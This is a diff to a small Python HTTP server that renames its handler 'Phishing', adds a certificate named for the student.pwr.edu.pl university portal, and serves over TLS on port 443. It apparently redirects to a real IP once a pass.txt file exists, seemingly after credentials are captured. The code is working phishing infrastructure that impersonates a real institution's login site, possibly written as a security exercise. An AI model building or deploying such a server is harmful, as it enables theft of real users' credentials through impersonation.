@@ -6,11 +6,12 @@ import mimetypes
 from cgi import parse_header, parse_multipart
 from urlparse import parse_qs
 
-REDIRECT='http://student.pwr.edu.pl'
-PORT=1234
+CERTIFICATE='./signed_certificate.student.pwr.edu.pl.pem'
+REDIRECT='http://156.17.193.186'
+PORT=443
 
 
-class FakeRedirect(SimpleHTTPServer.SimpleHTTPRequestHandler):
+class Phishing(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def parse_POST(self):
        ctype, pdict = parse_header(self.headers['content-type'])
        if ctype == 'multipart/form-data':
@@ -34,7 +35,6 @@ class FakeRedirect(SimpleHTTPServer.SimpleHTTPRequestHandler):
        print("request: " + self.path)
        if os.path.exists('./pass.txt'):
           self.send_response(301)
-#          new_path = '%s%s'%(, self.path)
           self.send_header('Location', REDIRECT)
           self.end_headers()
        elif self.path == '/':
@@ -58,7 +58,7 @@ class FakeRedirect(SimpleHTTPServer.SimpleHTTPRequestHandler):
           
 
 print("server works on port: ", PORT , " - redirect to ", REDIRECT)
-httpd = BaseHTTPServer.HTTPServer(('localhost', PORT), FakeRedirect)#SimpleHTTPServer.SimpleHTTPRequestHandler)
-#httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server_nowy.pem', server_side=True)
+httpd = BaseHTTPServer.HTTPServer(('localhost', PORT), Phishing)
+httpd.socket = ssl.wrap_socket (httpd.socket, certfile=CERTIFICATE, server_side=True)
 httpd.serve_forever()
 
